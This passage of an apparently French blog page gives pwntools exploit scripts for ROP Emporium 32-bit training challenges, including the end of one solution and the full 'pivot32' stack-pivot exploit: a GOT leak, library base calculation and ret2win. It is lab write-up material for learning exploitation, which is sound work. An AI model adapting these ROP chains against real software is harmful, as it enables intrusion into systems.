</span><span class="n">gadget_pext</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804854a</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">padding</span> <span class="o">=</span> <span class="s">b'A'</span> <span class="o">*</span> <span class="mi">44</span>
    
    <span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">rop_write</span><span class="p">(</span><span class="s">b'./flag.txt'</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080483d0</span><span class="p">)</span> <span class="o">+</span> <span class="s">b'RET!'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr_write</span><span class="p">)</span>
    
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">b"&gt; "</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
</code></pre></div></div>

<p><br /></p>

<h1 id="pivot32">pivot32</h1>

<blockquote>
  <p><em>There’s only enough space for a small ROP chain on the stack, but you’ve been given space to stash a much larger chain elsewhere. Learn how to pivot the stack onto a new location.</em></p>
</blockquote>

<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/pivot.html">ici</a></p>

<h2 id="solution--6">solution :</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="n">libpivot32</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"libpivot32.so"</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./pivot32'</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>

<span class="c1"># gdb.attach(io.proc.pid, 'b*pwnme+198')
</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">b'A'</span> <span class="o">*</span> <span class="mi">44</span>

<span class="c1">### GADGET ###
# 0x0804882e: xchg eax, esp; ret; 
</span><span class="n">gadget_xchg</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804882e</span><span class="p">)</span>

<span class="c1"># 0x0804882c: pop eax; ret; 
</span><span class="n">gadget_pop</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804882c</span><span class="p">)</span>

<span class="c1">## Adresse utile.
</span><span class="n">addr_puts</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span>
<span class="n">addr_foothold_fun_plt</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'foothold_function'</span><span class="p">])</span>
<span class="n">addr_foothold_fun_got</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'foothold_function'</span><span class="p">])</span>
<span class="n">addr_main</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">])</span>

<span class="c1">## On va faire pivoter le stack.
</span><span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">)</span>
<span class="n">addr_heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">b'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">4</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">b' '</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">f"pivot : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr_heap</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>


<span class="c1">### Leaks libpivot32.so
</span><span class="n">rop1</span> <span class="o">=</span> <span class="n">addr_foothold_fun_plt</span>
<span class="n">rop1</span> <span class="o">+=</span> <span class="n">addr_puts</span>
<span class="n">rop1</span> <span class="o">+=</span> <span class="n">addr_main</span>
<span class="n">rop1</span> <span class="o">+=</span> <span class="n">addr_foothold_fun_got</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop1</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">b'&gt; '</span><span class="p">)</span>

<span class="c1">## Stack pivot 
</span><span class="n">payload_pivot</span> <span class="o">=</span> <span class="n">padding</span>
<span class="n">payload_pivot</span> <span class="o">+=</span> <span class="n">gadget_pop</span>
<span class="n">payload_pivot</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr_heap</span><span class="p">)</span>
<span class="n">payload_pivot</span> <span class="o">+=</span> <span class="n">gadget_xchg</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload_pivot</span><span class="p">)</span>


<span class="c1">## On calcul les adresses présentes dans libpivot32.so grâce au leak.
</span><span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'x86'</span><span class="p">)</span>
<span class="n">addr_foothold</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">b'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">2</span><span class="p">][:</span><span class="mi">4</span><span class="p">])</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">f'foothold_function : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr_foothold</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

<span class="n">base_libpivot</span> <span class="o">=</span> <span class="n">addr_foothold</span> <span class="o">-</span> <span class="n">libpivot32</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'foothold_function'</span><span class="p">]</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">f"libpivot32.so : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_libpivot</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">addr_ret2win</span> <span class="o">=</span> <span class="n">base_libpivot</span> <span class="o">+</span> <span class="n">libpivot32</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'ret2win'</span><span class="p">]</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">f'ret2win : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr_ret2win</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Back to main!"</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">)</span>

<span class="n">rop2</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr_ret2win</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">rop2</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">()</span>

<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
</code></pre></div></div>

  </div><a class="u-url" href="/ropemopium32bits" hidden></a>
</article>
      </div>
    </main><!-- ici y'aura peut être des trucs --></body>

</html>
